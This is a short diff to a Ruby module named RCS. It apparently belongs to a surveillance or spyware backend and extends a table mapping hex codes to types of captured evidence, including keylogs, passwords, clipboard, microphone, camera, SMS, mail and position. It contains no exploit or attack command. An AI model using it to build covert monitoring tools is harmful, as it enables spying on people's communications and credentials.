@@ -5,8 +5,10 @@ module RCS
 
 EVIDENCE_TYPES = { 0x0240 => :DEVICE,
                    0x0140 => :CALL,
+                   0x0230 => :CALLIST,     #missing
+                   0xC2C2 => :MIC,         #missing
                    0x0241 => :INFO,
-                   0xB9B9 => :SNAPSHOT,
+                   0xB9B9 => :SCREENSHOT,
                    0x0040 => :KEYLOG,
                    0xE9E9 => :CAMERA,
                    0xC6C6 => :CHAT,
@@ -14,18 +16,24 @@ EVIDENCE_TYPES = { 0x0240 => :DEVICE,
                    0x0280 => :MOUSE,
                    0x0100 => :PRINT,
                    0x0180 => :URL,
-                   0x0181 => :URLCAPTURE,
+                   0x0181 => :URLCAPTURE,  #missing
                    0xD9D9 => :CLIPBOARD,
                    0xFAFA => :PASSWORD,
-                   0x0000 => :FILEOPEN,
-                   0x0001 => :FILECAP,
+                   0x0000 => :FILEOPEN,    #file
+                   0x0001 => :FILECAP,     #file
                    0x1011 => :APPLICATION,
-                   0xD0D0 => :DOWNLOAD,
-                   0x1220 => :LOCATION,
-                   0xEDA1 => :FILESYSTEM,
+                   0xD0D0 => :DOWNLOAD,    #file
+                   0x1220 => :POSITION,
+                   0xEDA1 => :FILESYSTEM,  
                    0x1001 => :MAILRAW,
+                   0x0210 => :MAIL,        #missing  #message
+                   0x0211 => :SMS,         #missing  #message
+                   0x0213 => :SMS_NEW,     #missing  #message
+                   0x0212 => :MMS,         #missing  #message
                    0x0200 => :ADDRESSBOOK,
-                   0x0201 => :CALENDAR}
+                   0x0250 => :IADDRESSBOOK,#missing
+                   0x0201 => :CALENDAR,    #missing
+                   0x0202 => :TASK}        #missing
 
 class EvidenceDeserializeError < StandardError
   attr_reader :msg
